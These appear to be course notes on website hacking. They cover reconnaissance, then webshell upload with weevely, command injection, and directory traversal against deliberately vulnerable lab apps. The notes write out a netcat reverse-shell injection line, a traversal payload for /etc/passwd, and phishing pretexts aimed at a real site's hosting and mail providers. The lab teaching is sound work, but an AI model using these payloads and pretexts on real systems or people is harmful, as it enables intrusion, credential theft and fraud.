WEBSITE HACKING
===

### <span style = "color: #569cd6">Introduction</span>

### 1. What is a "Server"? (The Hardware)
People often talk about "The Cloud" as if it’s a magical place. The instructor clarifies that **a server is just a computer**.
* It can be a supercomputer in a massive data center, or it can be your old laptop sitting on your desk.
* What makes it a "server" is simply that it has **special software** installed that allows other people to connect to it and look at files stored on its hard drive.

### 2. The Web Server (The Software / The "Waiter")
You have the hardware (the computer), but you need software to make it talk to the internet. This is the **Web Server**.
* **The Job:** Its main job is to "serve" files. When you type `google.com`, this software looks into its folders, finds the file you asked for (usually an HTML file), and sends it to your browser.
* **The Content:** It holds the "static" parts of the website—the images, the logos, and the design files (HTML/CSS) that make the page look pretty.

### 3. The Web Application (The Brains)
Static files aren't enough. If you go to Amazon, the page isn't just a picture; it calculates shipping, checks if you are logged in, and processes your credit card. That is the job of the **Web Application**.
* **The Code:** These are scripts written in programming languages like **PHP, Python, or Ruby**.
* **The Job:** It processes logic. It says, "Oh, User A is logging in? Let me check if their password is correct." or "User B wants to buy this phone? Let me calculate the tax."

### 4. The Database (The Memory / The Filing Cabinet)
The Web Application is smart, but it doesn't remember things on its own. It needs a place to store long-term information. This is the **Database**.
* **The Structure:** Think of it like a massive Excel sheet with many tables.
* **The Content:**
    * **Users Table:** Stores Usernames and Passwords.
    * **Products Table:** Stores Product Names (iPhone, iPad), Prices, and Stock levels.
* **The Relationship:** The Web Application **talks** to the Database.
    * *Example:* You search for "iPhone." The Web App asks the Database, "Do we have iPhones?" The Database replies, "Yes, $999." The Web App then puts that price on the screen for you to see.



### Summary of the Workflow
To put it all together, imagine walking into a **shop**:

1.  **The Server (The Building):** The physical location where everything happens.
2.  **The Web Server (The Store Layout):** The shelves, the posters, and the aisles. This is what you "see" immediately (Images/HTML).
3.  **The Web Application (The Clerk):** The person you talk to. You ask, "Do you have this in size Medium?" They go check for you.
4.  **The Database (The Warehouse in the back):** Where the clerk goes to check the actual stock. The clerk (Web App) comes back and tells you the answer.

### Why this matters for Hacking
The instructor emphasizes this structure because different hacks target different parts:
* If you attack the **Web App**, you might trick the logic (e.g., buying an item for $0).
* If you attack the **Database** (SQL Injection), you might steal everyone's passwords or credit card numbers directly from the "warehouse."

---
### <span style = "color: #569cd6">How to Hack a Website?</span>

### Part 1: The Three Ways to Hack a Website

1.  **Server-Side Attacks (The Back Door):**
    * **What it is:** You attack the computer the website lives on.
    * **How:** You look for outdated software (like an old version of Apache or Linux) and exploit it to take control of the whole machine.
    * **Note:** The instructor says you *already learned this* in previous sections.

2.  **Client-Side Attacks (The Human Factor):**
    * **What it is:** You attack the humans who manage the website.
    * **How:** You use social engineering (phishing emails, fake updates) to hack the administrator's laptop. Once you own their laptop, you steal their passwords and log in to the website as them.
    * **Note:** You *already learned this* too.

3.  **Web Application Attacks (The Front Door):**
    * **What it is:** You attack the specific code of the website (the HTML, PHP, or Python scripts).
    * **How:** You interact with the website like a normal user—filling out forms, clicking links—but you input malicious data to confuse the application.
    * **Note:** **This is the focus of the new section.**

### Part 2: The Lab Setup
To practice this, you will use the **Metasploitable** machine again. This machine is intentionally broken and full of holes so you can practice safely.

* **The Target IP:** `10.20.14.204` (In your own lab, this might be different, so always check with `ifconfig`).
* **The Location:** The websites are stored in `/var/www`. This is the standard folder where Linux keeps website files.
* **The Applications:** The instructor points out two specific "practice targets" installed on this machine:
    1.  **DVWA (Damn Vulnerable Web App)**
    2.  **Mutillidae**

These aren't real store websites; they are training grounds designed to be hacked.

### Part 3: Configuration (Crucial Step)
Before you start hacking, you need to configure the practice targets.

**1. Accessing the Target**
* Open the web browser on your Kali machine.
* Type the IP address (`10.20.14.204`) into the URL bar.
* Click on **DVWA**.

**2. Logging In**
* **Username:** `admin`
* **Password:** `password`
* *(Note: These are the default credentials for DVWA).*

**3. Lowering the Shields**
* **The Action:** Go to "DVWA Security" settings and change the level to **"Low"**.
* **The Reason:** Real websites have firewalls and security filters. However, since you are just learning *how* the attacks work, you want to remove these obstacles first.

### Summary Checklist

| Action | Command / Detail |
| :--- | :--- |
| **Target** | Metasploitable (IP: 10.20.14.204) |
| **Tool** | Web Browser (Firefox on Kali) |
| **Login** | User: `admin` / Pass: `password` |
| **Setup** | Set Security Level to **"Low"** or **"0"** |
| **Goal** | Test the web application code (not the server OS) |

---

### <span style = "color: #569cd6">Information Gathering - Using Whois Lookup</span>

### Part 1: The Strategy (What are we looking for?)
The goal is to build a profile of the target. We aren't looking for "open ports" on the router anymore (that was the previous section). Now, we are looking for **web-specific** details:
* **IP Address:** The actual address of the server.
* **Domain Info:** Who owns the website? When does the domain expire?
* **Technologies:** Is the site built with PHP? Python? Is it running on Apache or Nginx?
* **Hidden Files:** Are there secret admin pages not listed on the menu?

**Why the instructor skips Maltego and Nmap:**
He mentions tools like Maltego and Zenmap but decides to skip them.
* **Reason:** These tools focus on the *infrastructure* (the servers and networks), which you already learned in the previous "Network Hacking" section. Now, he wants to focus purely on tools designed for *websites*.


### Part 2: Whois Lookup (The Digital ID Card)
The main tool introduced in this lecture is **Whois**.

**What is it?**
When you buy a domain name (like `google.com` or `isecurity.org`), you have to provide your name, address, email, and phone number to a registrar. By default, this information is **public**. The Whois protocol allows anyone to look up this registration data.

**How to use it:**
You don't even need a special hacker tool for this. You can use free websites like `whois.domaintools.com`.



**What data can you find?**
The instructor runs a Whois lookup on `isecurity.org` and finds three critical pieces of intelligence:

#### 1. Contact Information
* **The Data:** Email addresses, phone numbers, and physical office locations of the owner.
* **The Hacker's View:** This is fuel for **Social Engineering**. If you know the owner's name and email, you can send them a phishing email pretending to be their hosting provider.
* *Note:* The instructor mentions "Privacy Protection." Many modern websites pay extra to hide their real address. If privacy is ON, you will see the registrar's address instead of the owner's.

#### 2. Technical Stack (The "Fingerprint")
* **The Data:** The lookup revealed the server is running **Apache version 2.2.31** on a **Unix** operating system. It also showed add-ons like `mod_ssl`.
* **The Hacker's View:** This is gold.
    * If you know they use **Apache 2.2.31**, you can go to Google or an exploit database and search specifically for *"vulnerabilities in Apache 2.2.31"*. You don't have to waste time testing exploits for Windows or Nginx.

#### 3. Name Servers (The Hosting Provider)
* **The Data:** The record showed the name servers belonged to `dimnof.net`.
* **The Hacker's View:** This tells you who hosts the website.
    * **Attack Vector:** You could call the hosting company (`dimnof.net`) pretending to be the owner of `isecurity.org` and claim you lost your password, trying to trick support into giving you access.

### Summary Checklist

| Information | Why it matters |
| :--- | :--- |
| **Registrant Name** | Used for phishing or password guessing (personal info). |
| **Creation Date** | Tells you how established the site is. |
| **Server Version** | Helps you find specific software exploits (e.g., outdated Apache). |
| **Name Servers** | Tells you the hosting provider for social engineering attacks. |

---
### <span style = "color: #569cd6">Discovering Technologies Used On The Website</span>

### 1. The Tool: Netcraft
**Netcraft** is a website that scans other websites to determine their underlying technology. You simply type in your target (e.g., `isecurity.org`), and it gives you a technical report.

### 2. Hosting & History (The Infrastructure)
* **What found:** The site is hosted in the Netherlands. The hosting provider is a company called `dimofinf.net`.
* **The Hacker's Strategy (Supply Chain Attack):** The instructor points out a ruthless strategy here. If `isecurity.org` is too hard to hack directly, you might try to hack `dimofinf.net` (the hosting company) instead. If you break into the landlord's office, you have keys to all the apartments.

### 3. Server-Side Technologies (The Engine)
This is the most critical part of the scan for direct attacks.

* **Web Server:** Apache (we saw this in the previous video).
* **Language:** **PHP**.
    * **What it means:** The "brain" of the website thinks in the PHP programming language.
    * **Why it matters:** If you want to upload a virus or a backdoor to this site, you **must write it in PHP**. If you try to upload a Python or C# virus, the server won't know how to run it. This tells you exactly what format your weapon needs to be.

### 4. Client-Side Technologies (The User Interface)
* **Technologies:** **JavaScript** and **jQuery**.
* **What it means:** These are scripts that run on the *visitor's* browser, not the server.
* **Why it matters:** If you find a vulnerability here, you can't necessarily destroy the server, but you can attack the **people visiting the site**. You could use malicious JavaScript to steal their session cookies or redirect them to a fake login page.

### 5. Web Applications (The Easy Targets)
Netcraft detects pre-made software packages installed on the site.

* **Software Found:** **WordPress** and **cPanel**.
* **WordPress:** This is a very popular system for managing blogs/sites.
* **cPanel:** This is a tool for managing the server hosting.

**The "Exploit Database" Strategy:** (exploit-db.com)
The instructor explains that finding "WordPress" is like striking gold. Because millions of people use WordPress, thousands of hackers are constantly finding bugs in it.
1.  He sees the site uses **WordPress**.
2.  He goes to a site: (exploit-db.com)
3.  He searches for "WordPress".
4.  He finds a huge list of *ready-to-use* hacks for WordPress.

Instead of writing a complex hack from scratch, he can potentially just download a script that someone else wrote to break into WordPress.

### Summary of Intelligence Gathered

| Information | Technology Found | Hacker's Plan |
| :--- | :--- | :--- |
| **Hosting** | Dimofinf.net | Hack the host if the site is too tough. |
| **Server-Side** | PHP | Create backdoors/viruses in PHP format. |
| **Client-Side** | JavaScript | Plan attacks against the site's visitors. |
| **Application** | WordPress | Search Exploit-DB for known WordPress bugs. |

---

### <span style = "color: #569cd6">Gathering Comprehensive DNS Information</span>

The instructor uses a tool called **Robtex.com** to gather a comprehensive report.

### Part 1: The Concept (What is DNS?)
The instructor starts with a quick refresher.
* **DNS (Domain Name System):** It is the phonebook of the internet. When you type `facebook.com`, DNS translates that name into an IP address (like `157.240.22.35`) so your computer can connect.
* **The Mission:** By looking at these records, we can find out not just the IP address, but also who handles their email, who hosts their files, and who they used to work with.

### Part 2: The Findings (Using Robtext)
The instructor inputs `isecurity.org` into Robtext. Here is the intelligence gathered and **how a hacker uses it**:

#### 1. Name Servers (The Landlord)
* **The Data:** The report shows the name servers belong to **Digital Ocean**.
* **What it means:** Digital Ocean is the company hosting the website files.
* **The Hacker's Plan (Social Engineering):**
    * You can now send a phishing email to the target's admin: *"Hello, this is Digital Ocean support. We detected an issue with your server. Please login here to fix it."*
    * Because you know their actual provider, the lie is believable.

#### 2. Mail Servers (The Postman)
* **The Data:** The report shows the mail servers belong to **Google**.
* **What it means:** They use Gmail/G-Suite for their corporate emails.
* **The Hacker's Plan:**
    * You can pretend to be Google Support.
    * You know not to bother trying to hack a local email server on their machine because the emails aren't stored there—they are stored with Google.

#### 3. Reverse DNS (The Neighbors)
* **The Concept:**
    * **Standard DNS:** Name -> IP (Where is `facebook.com`?)
    * **Reverse DNS:** IP -> Name (Who else lives at this IP address?)
* **The Strategy (Shared Hosting Attack):**
    * Often, one server hosts hundreds of websites.
    * If you cannot hack your Target (`Site A`), you check the Reverse DNS to find `Site B` hosted on the same server.
    * If `Site B` is weak, you hack it, gain access to the server, and then move laterally to attack `Site A`.
* **The Result:** In this specific video, the target was on a dedicated server (no neighbors), but usually, you will find a list of other sites here.

#### 4. History (The Paper Trail)
* **The Data:** Robtext keeps a timeline of changes.
* **What was found:** The target *used* to be hosted by **Dimofinf**, but they switched to **Digital Ocean**.
* **The Hacker's Plan:**
    * This is great for credibility. You could email them claiming to be the *old* provider: *"Hey, we still have some of your data from the migration, please log in to confirm deletion."*

### Summary of Intelligence

| Data Point | What it reveals | Attack Vector |
| :--- | :--- | :--- |
| **A Record** | The IP Address | Direct server attacks. |
| **MX Record** | Email Provider (Google) | Phishing pretending to be Google. |
| **NS Record** | Host (Digital Ocean) | Phishing pretending to be the Host. |
| **Reverse DNS** | Other sites on the same IP | Hacking a "neighbor" to get in. |
| **History** | Past providers | Pretexting (lying) based on past events. |

---

### <span style = "color: #569cd6">Discovering Websites on The Same Server</span>

### The Core Concept: Shared Hosting
Most websites don't have a whole server to themselves. Instead, they rent space on a large server alongside hundreds of other websites.

**The Analogy:**
Imagine your target lives in a highly secure apartment (Apartment 5). They have a steel door, three locks, and an alarm. You can't get in.
* **The Server:** The apartment building.
* **The Neighbors:** The other people living in Apartment 3, Apartment 4, etc.
* **The Attack:** You realize that Apartment 3 (a random neighbor) leaves their window open. You climb into Apartment 3, walk into the hallway, and then break into Apartment 5 from the inside (or maybe the walls between them are very thin).

In hacking terms: **If you can't hack your target, hack their neighbor.**


### Step 1: Confirming the "Neighborhood"
How do you know if two websites are neighbors? They will have the **exact same IP address**.

* **The Test:** The instructor uses the `ping` command.
    * `ping zaid.com` -> Returns IP `1.2.3.4`
    * `ping reba.me` -> Returns IP `1.2.3.4`
* **The Conclusion:** Since they resolve to the same IP, they are essentially two folders on the same hard drive.

### Step 2: Finding the Neighbors (The Bing Trick)
The instructor introduces a simple trick using the **Bing** search engine to list every website living on a specific server.

* **The Command:** `ip:[Target IP Address]`
* **Example:** `ip:216.58.210.14`
* **The Result:** Bing will list every single website hosted on that IP.

### Step 3: The Attack Path
1.  **Scan:** You use the `ip:` command to find 50 other websites on the same server as your target.
2.  **Hunt:** You scan those 50 other sites. Maybe your target is secure, but maybe one of the neighbors is a neglected blog running an old, vulnerable version of WordPress.
3.  **Breach:** You hack the weak neighbor. You upload a "Shell" (like the backdoor from previous lectures) to the neighbor's site.
4.  **Pivot:** Once you have shell access to the server, you can often navigate up the folder structure.
    * You are in: `/var/www/neighbor_site/`
    * You type: `cd ..` (Go back one step)
    * You see: `/var/www/target_site/`
    * **Win:** You can now read or modify your target's files because you are inside the system.

### Summary Checklist

| Action | Command/Tool | Purpose |
| :--- | :--- | :--- |
| **Verify IP** | `ping [target.com]` | Get the IP address of the target. |
| **Find Neighbors** | Bing Search: `ip:[IP_Address]` | List all other sites on that server. |
| **Attack** | Exploit the *neighbor* | Gain access to the server via the weakest link. |
| **Navigate** | `cd ../[target_folder]` | Move from the neighbor's folder to the target's folder. |

---
### <span style = "color: #569cd6">Discovering Subdomains</span>

This lecture introduces **Subdomain Enumeration**, a critical reconnaissance step to expand your attack surface. Instead of just attacking the main door (`google.com`), you are looking for side doors, back doors, and windows (`mail.google.com`, `admin.google.com`, `dev.google.com`).

### Part 1: What is a Subdomain?
* **The Definition:** A subdomain is the part of the address that comes *before* the main domain name.
    * **Example:** In `mail.google.com`:
        * `google.com` is the **Domain**.
        * `mail` is the **Subdomain**.
* **Why it matters:** Different subdomains often host completely different applications.
    * `google.com` is a **Search Engine**.
    * `mail.google.com` is an **Email Service**.
    * `dev.google.com` might be a **Developer Portal**.
    * `test.google.com` might be a **broken, experimental site**.

### Part 2: Why Hackers Hunt Subdomains?
Finding subdomains is like finding extra rooms in a house you want to break into.
1.  **Hidden Applications:** You might find internal tools meant only for employees (e.g., `employee-portal.target.com`).
2.  **Beta Versions:** Developers often put unfinished, buggy code on subdomains like `beta.target.com` or `dev.target.com`. These are easier to hack because they haven't been secured yet.
3.  **Sensitive Data:** Sometimes subdomains expose files or data that shouldn't be public.

### Part 3: The Tool (Knockpy)

#### How to use it:
* **Command:** `knockpy --domain [target.com] --recon`
    * `--domain`: Specifies the target (e.g., `google.com`).
    * `--recon`: Tells the tool to scan **passively**.

#### The Two Modes of Knockpy:
1.  **Recon Mode (Passive) - *Recommended in lecture*:** `--recon`
    * **How it works:** It searches public records (VirusTotal, search engines, DNS databases) to find subdomains that have already been listed publicly.
    * **Pros:** Fast, stealthy (doesn't interact directly with the target server much).
    * **Cons:** Might miss secret subdomains that have never been used publicly.
2.  **Brute Force Mode (Active):** `--bruteforce`
    * **How it works:** It guesses names using a wordlist (`admin`, `test`, `dev`, `shop`) and tries to connect to them one by one.
    * **Pros:** Can find hidden subdomains that aren't in public records.
    * **Cons:** Slower, noisier (the target might detect you scanning).



### Summary Checklist

| Component | Command / Concept | Benefit |
| :--- | :--- | :--- |
| **Target** | `google.com` | The main fortress. |
| **Goal** | Find `mail.google.com`, `dev.google.com`, etc. | Find weaker entry points. |
| **Tool** | **Knockpy** | Automates the discovery process. |
| **Flag** | `--recon` | Scans quickly using public data. |

---
### <span style = "color: #569cd6">Discovering Sensitive Files</span>

Based on the transcript, this lecture moves from finding **subdomains** (external areas) to finding **hidden files and directories** (internal areas).

The instructor teaches you how to map out the "secret" structure of a website to find sensitive files that the admin didn't intend for you to see.

### Part 1: The Concept (The Map vs. The Territory)
The instructor starts by explaining how a URL corresponds to actual files on a server.

* **The File System:** On a Linux server, website files usually live in `/var/www/`.
* **The Translation:** When you type a URL, the web server translates it into a file path.
    * **URL:** `http://10.20.14.204/mutillidae/index.php`
    * **Real Location:** `/var/www/mutillidae/index.php`
* **The Hidden Reality:** Just because there isn't a link on the homepage pointing to a file (like `passwords.txt` or `admin_backup.zip`), doesn't mean the file isn't there. If you guess the name correctly, the server will show it to you.



### Part 2: The Tool (Dirb)
The instructor introduces **Dirb**, a "Web Content Scanner."

**How it works (Brute Force):**
Dirb is essentially a very fast guesser. It doesn't "hack" the server in a complex way; it just asks for thousands of possible filenames one by one.

* **The Analogy:** Imagine a hallway with a thousand doors, but no numbers on them. You have a list of common names (Office, Storage, Janitor, Safe). You try opening a door labeled "Office"—if it opens, you mark it down. If it's locked or doesn't exist, you move to the next name.

**The Command:**
`dirb [Target URL] [Wordlist]`

* **Target URL:** The specific folder you want to scan (e.g., `http://10.20.14.204/mutillidae`).
* **Wordlist:** A text file containing the list of names to guess.
    * *Note:* If you don't specify a wordlist, Dirb uses its default one located at `/usr/share/dirb/wordlists/common.txt`. This file contains thousands of common names like `admin`, `login`, `test`, `config`, etc.

### Part 3: Configuration Options
The instructor highlights a few ways to tweak the tool using `man dirb` (the manual):

1.  **Recursion (`-r` to disable):** By default, if Dirb finds a folder called `/admin/`, it will go inside and start scanning *that* folder too. This can take a long time. You can turn this off to scan only the top layer.
2.  **Authentication (`-u`):** If the website requires a username/password popup to even see the page, you can provide those credentials here.
3.  **Output (`-o`):** You can save the results to a file so you can review them later without scrolling through the terminal.

### Part 4: The Demonstration
The instructor runs the tool against the `mutillidae` application.

* **Target:** `http://10.20.14.204/mutillidae`
* **Why this target?** He specifically points the tool at the `/mutillidae` folder rather than the main IP address.
    * *Reason:* The server has other apps (like phpMyAdmin) that he doesn't want to scan right now. He wants to focus the "guessing power" only on the specific application he is attacking.

```bash
dirb http://10.20.14.204/mutillidae/
```
=》
```bash
WORDLIST_FILE: /usr/share/dirb/wordlists/common.txt
```


### Summary Checklist

| Component | Description |
| :--- | :--- |
| **Goal** | Find hidden files (configs, passwords) not linked on the homepage. |
| **Tool** | **Dirb** (A brute-force scanner). |
| **Input** | A URL and a Wordlist (Dictionary of guesses). |
| **Mechanism** | Sends HTTP requests for every word in the list. If the server says "200 OK" (Found), Dirb alerts you. |
| **Key Path** | `/usr/share/dirb/wordlists/` (Where the dictionaries live). |

---
### <span style = "color: #569cd6">Analyzing Discovered Files</span>

This lecture focuses on **analyzing the "loot"** obtained from the `dirb` scan we ran in the previous video.

The scan returned a list of hidden files and directories. Now, the instructor sifts through them to separate the useless noise from the critical security vulnerabilities.

### 1. The "Noise" (Ignore these)
The scan found files like `favicon.ico`, `header.php`, and `footer.php`.
* **Verdict:** These are standard website components (icons, design layouts). They rarely help a hacker, so we ignore them.

### 2. The "Entry Points" (Login Pages)
* **File Found:** `login.php`
* **Why it matters:** The instructor shares a common frustration: sometimes you manage to steal a username and password, but you **can't find where to log in**. Finding the specific administration portal (like `admin_login.php` or `backend.php`) is often half the battle.

### 3. The "Technical Blueprint" (phpinfo)
* **File Found:** `phpinfo.php`
* **What it is:** This is a diagnostic page that developers often leave behind by mistake.
* **The Intel:** It displays *everything* about the server's configuration:
    * **PHP Version:** (e.g., PHP 5) - Helps you look for specific exploits for that version.
    * **Modules:** Shows if MySQL is installed.
    * **File Paths:** Shows exactly where configuration files are stored on the hard drive.
* **Hacker Value:** It’s like finding the blueprints of a bank before trying to rob it.



### 4. The "Treasure Map" (robots.txt)
This is the most critical finding in the lecture.

* **What is robots.txt?** It is a text file used to talk to search engines like Google. It tells them: *"Please do not list these specific folders in your search results."*
* **The Irony:** By telling Google "Don't look here," the admin is effectively creating a list of **"Secret places I don't want anyone to see."**
* **The Hack:** Hackers immediately read this file to see exactly what the admin is hiding.

**What the instructor found inside `robots.txt`:**

#### A. The `passwords` Directory
* **The Path:** The file said `Disallow: /passwords`.
* **The Action:** The instructor navigated to `http://【target】/mutillidae/passwords`.
* **The Result:** He found a file called `accounts.txt`. Inside, there were cleartext credentials:
    * User: `admin`
    * Password: `adminPass`
* **Impact:** He just hacked the site without running a single exploit. He simply read a text file that was left unprotected.

#### B. The `config.inc` File
* **The Path:** The file said `Disallow: config.inc`.
* **The Action:** He opened the file.
* **The Result:** This file contained the **Database Keys**.
    * `dbuser`: "root"
    * `dbpass`: "" (Blank)
* **Impact:** With these credentials, a hacker could potentially connect directly to the database and steal all customer data, delete tables, or take over the site.

### Summary Checklist of Found Files

| File Found | Purpose | Hacker Value |
| :--- | :--- | :--- |
| **login.php** | User authentication page. | Provides a place to use stolen credentials. |
| **phpinfo.php** | Server configuration details. | Reveals exact versions and paths for exploit planning. |
| **robots.txt** | SEO instructions for Google. | reveals "Forbidden" directories (Secrets). |
| **accounts.txt** | (Found via robots.txt) | **CRITICAL:** Contained actual passwords. |
| **config.inc** | (Found via robots.txt) | **CRITICAL:** Contained database connection keys. |

### Key Takeaway
You don't always need complex code to hack a system. Sometimes, **Information Gathering** alone is enough. By simply finding files the admin forgot to hide (`accounts.txt` and `config.inc`), the instructor gained full administrative access.

---

FILE UPLOAD, CODE EXECUTION & FILE INCLUSION VULNERABILITIES
===

### <span style = "color: #569cd6">Discovering & Exploiting File Upload Vulnerabilities</span>

This lecture introduces **File Upload Vulnerabilities**, which the instructor describes as "the simplest type of vulnerability" but also one of the most dangerous.

### The Concept: The "Trojan Horse" Upload
Many websites allow users to upload files (e.g., changing your profile picture, uploading a CV, or posting a photo of a car).
* **The Vulnerability:** If the website does not check *what* kind of file you are uploading, it is vulnerable.
* **The Attack:** instead of uploading a harmless image (like `car.jpg`), you upload a malicious script (like `virus.php`). If the server accepts it, that script runs on the server, giving you control.

### Step 1: Reconnaissance (Testing the System)
Before attacking, the instructor tests how the website behaves normally.

1.  **Navigate to the Upload Page:** He finds a page on DVWA (the practice site) that asks for an image upload.
2.  **Upload a Safe File:** He uploads a real image (`car.jpg`).
3.  **Check the Result:** The website confirms the upload and shows the path where the file is stored:
    * `../../hackable/uploads/car.jpg`
4.  **Verify:** He types that URL into his browser to make sure he can see the image. This confirms that **files he uploads are accessible and run by the server.**

### Step 2: Creating the Weapon (Weevely)
The instructor introduces a tool called **Weevely**. Think of Weevely as a two-part tool: it is a **factory** that creates the virus, and a **remote control** used to talk to it.

* **Command:** `weevely generate [password] [path]`
* **Example:** `weevely generate 123456 /root/shell.php`
    * **generate:** Tells the tool to make a new payload.
    * **123456:** This is the password. The virus is password-protected so only *you* can use it.
    * **shell.php:** The name of the malicious file.

* **The Result:** You now have a file called `shell.php` on your computer.

### Step 3: The Attack (Uploading the Shell)
1.  **Go back to the website:** The instructor returns to the same upload form used for the car picture.
2.  **Select the Shell:** He chooses `shell.php` instead of an image.
3.  **Hit Upload:**
    * **Result:** "File uploaded successfully."
    * **Why this happened:** The website had **Low Security**. It didn't check if the file was an image or a script; it just accepted whatever was given.

### Step 4: Taking Control (Connecting)
Now the virus is sitting on the victim's server. You need to activate it.

1.  **Verify URL:** The instructor checks the browser URL: `.../hackable/uploads/shell.php`.
    * *Note:* A blank page usually means the code is running successfully (no error messages).
2.  **Connect with Weevely:**
    * **Command:** `weevely [Target_URL] [Password]`
    * **Example:** `weevely http://10.20.14.204/.../shell.php 123456`
3.  **Access Granted:** The terminal prompt changes. You are no longer on your Kali machine; you are virtually inside the web server.

### Step 5: Post-Exploitation (What can you do?)
Once connected, the instructor runs standard Linux commands to prove he owns the system:

* **`pwd`**: Shows the current directory on the victim server.
* **`id`**: Shows who he is logged in as (`www-data`—the standard user for web servers).
* **`uname -a`**: Shows system details (confirming it's the Metasploitable Linux machine).

**Advanced Weevely Features:**
The instructor mentions that Weevely isn't just a simple terminal. If you type `help` inside Weevely, you see advanced modules for:
* **Privilege Escalation:** Trying to become the "Root" (Super Admin) user.
* **SQL Queries:** Stealing database data directly through the shell.
* **Network Scanning:** using the hacked server to attack other internal computers.

### Summary Checklist

| Step | Action | Tool Used |
| :--- | :--- | :--- |
| **1. Test** | Upload a normal image to find the upload path. | Browser |
| **2. Generate** | Create a malicious PHP file. | `weevely generate` |
| **3. Upload** | Send the PHP file to the server. | Website Upload Form |
| **4. Connect** | remotely control the uploaded file. | `weevely [url] [pass]` |
| **5. Execute** | Run commands on the victim server. | Terminal (inside Weevely) |

---
### <span style = "color: #569cd6">Discovering & Exploiting Code Execution Vulnerabilities</span>

Based on the transcript, this lecture introduces **Code Execution Vulnerabilities** (often called Command Injection). This is widely considered one of the most critical vulnerabilities because it gives the hacker direct control over the operating system, not just the website.

### Part 1: The Concept
**What is Code Execution?**
Imagine a website has a tool that lets you ping a website to see if it is online.
1.  **Normal Behavior:** You type `google.com`. The website takes your input and runs the system command: `ping google.com`.
2.  **The Flaw:** The website trusts your input blindly. It takes whatever you type and pastes it directly into the system command.
3.  **The Attack:** You type `google.com; whoami`. The website tries to run `ping google.com; whoami`.

**The Magic Symbol: Semicolon (`;`)**
In Linux (and many other systems), the semicolon acts like a period in a sentence. It separates two distinct commands.
* `Command A ; Command B` means "Run Command A, **then** run Command B."


### Part 2: Testing the Vulnerability (The "Ping" Page)
The instructor demonstrates this on the "Ping" page of the DVWA practice site.

1.  **The Input:** He types an IP address: `10.20.14.203`.
2.  **The Injection:** He adds a second Linux command using the semicolon: `10.20.14.203 ; pwd`.
    * **`pwd`**: A Linux command that stands for "Print Working Directory." It asks the computer, "Which folder am I currently inside?"
3.  **The Result:** The website displays the ping results, but right below them, it prints something like `/var/www/html`.
    * **Conclusion:** The server executed the second command. This proves the hacker can run **any** command they want.

### Part 3: The Full Takeover (The Reverse Shell)
Printing the directory is fun, but hackers want full control. To do this, the instructor sets up a **Reverse Shell**.

**What is a Reverse Shell?**
Usually, you connect to a server (like logging into a website). In a Reverse Shell, you force the **server to connect back to you**. This helps bypass firewalls because firewalls often block incoming connections but allow outgoing ones.



#### Step A: The Listener (The Attacker's Waiting Game)
First, the instructor prepares his own computer (Kali) to receive the call from the victim.
* **Tool:** `Netcat` (often called the "Swiss Army Knife" of networking).
* **Command:** `nc -vv -l -p 8080`
    * **`nc`**: Netcat.
    * **`-l`**: Listen (Wait for a connection).
    * **`-p 8080`**: Listen specifically on Port 8080.
    * **`-vv`**: Verbose (Show me all the details/errors).

#### Step B: The Injection (The Victim Makes the Call)
Now, he goes back to the vulnerable "Ping" box on the website and injects a command that forces the server to call him.
* **The Command Injected:** `10.20.14.203 ; nc -e /bin/bash 10.20.14.204 8080`
    * **`10.20.14.203`**: The fake ping target (to satisfy the web form).
    * **`;`**: The separator.
    * **`nc`**: Telling the victim server to use Netcat.
    * **`10.20.14.204`**: The Attacker's IP (Where to call).
    * **`8080`**: The Port (Which door to knock on).
    * **`-e /bin/bash`**: **This is the most critical part.** It stands for "Execute Bash." It tells the server: *"When you connect to the hacker, give them my command line (Bash) so they can type commands on my machine."*

#### Step C: The Connection
1.  The instructor hits "Submit" on the website.
2.  The website hangs (because it is busy connecting).
3.  On the Instructor's terminal (The Listener), a connection appears!
4.  He types `ls`, `id`, and `uname -a`.
5.  **Result:** The server responds. He is no longer just a web visitor; he has terminal access to the server operating system.

### Summary Checklist

| Component | Command Used | Role |
| :--- | :--- | :--- |
| **Separator** | `;` | Chains commands together (Linux). |
| **Test Command** | `pwd` | Proves execution is possible. |
| **Listener** | `nc -l -p 8080` | Attacker waiting for the call. |
| **Payload** | `nc -e /bin/bash [IP] [Port]` | Victim calling the attacker and giving up control. |

---

### <span style = "color: #569cd6">Discovering & Exploiting Local File Inclusion Vulnerabilities</span>

### Part 1: The Vulnerability (The "Page" Parameter)
Modern websites often use a "template" system. instead of creating a separate file for every page, they use one main file that loads content dynamically.

* **The Scenario:** You browse a website and see a URL like this:
    `http://10.20.14.204/dvwa/vulnerabilities/fi/?page=include.php`
* **What it means:** The website has a parameter called `page`. It is telling the server: *"Go find the file named `include.php` and display it right here."*
* **The Flaw:** The server is too obedient. It doesn't check *which* file you are asking for. It just blindly fetches whatever you type after `page=`.

### Part 2: The Attack (Directory Traversal)
The instructor wants to read a sensitive system file. However, he is currently "standing" deep inside the website's folders (e.g., inside `/var/www/dvwa/vulnerabilities/fi/`).

To get to the sensitive system files (which are usually at the very top, or "Root," of the drive), he needs to navigate **up** the folder tree.

* **The Trick:** In computing, `..` (dot dot) means "Go back one folder" or "Go up one level."
* **The "Climb":** The instructor uses `../../../../../` to climb all the way out of the website folder to the root of the computer.



### Part 3: The Target (`/etc/passwd`)
The specific file the instructor targets is `/etc/passwd`.

* **What is it?** This is a standard file on all Linux / Unix systems.
* **What it contains:** It is essentially the "Guest List" of the computer. It lists every user account on the system (e.g., `root`, `www-data`, `mysql`).
* **Why Hackers want it:**
    1.  **Proof of Concept:** It proves the LFI attack is working because this file always exists.
    2.  **Reconnaissance:** It reveals the usernames. If you see a user named `admin`, you now have half the credentials needed to log in.

### Part 4: The Execution
1.  **Analyze the URL:** The instructor sees `?page=include.php`.
2.  **Construct the Payload:** He replaces `include.php` with his navigation string:
    `../../../../../etc/passwd`
3.  **The Result:** The website disappears, and instead, a block of text appears on the screen containing the system user list.
    * *Success:* The server went "back, back, back, back, back" to the root, opened the `etc` folder, grabbed the `passwd` file, and displayed it on the webpage.

### Summary Checklist

| Concept | Explanation |
| :--- | :--- |
| **Vulnerability** | Local File Inclusion (LFI). |
| **Mechanism** | The website blindly loads whatever file is specified in the URL. |
| **Attack Method** | **Directory Traversal** (`../`). |
| **Goal** | Read sensitive files outside the web folder. |
| **Target File** | `/etc/passwd` (The Linux user list). |

### Implication
This is critical because it's not just about reading user lists. If a hacker finds a config file (like `config.php` we found in the previous lecture), they could read the **Database Passwords** using this exact same method.

---
### <span style = "color: #569cd6">Remote File Inclusion Vulnerabilities - Configuring PHP Settings</span>

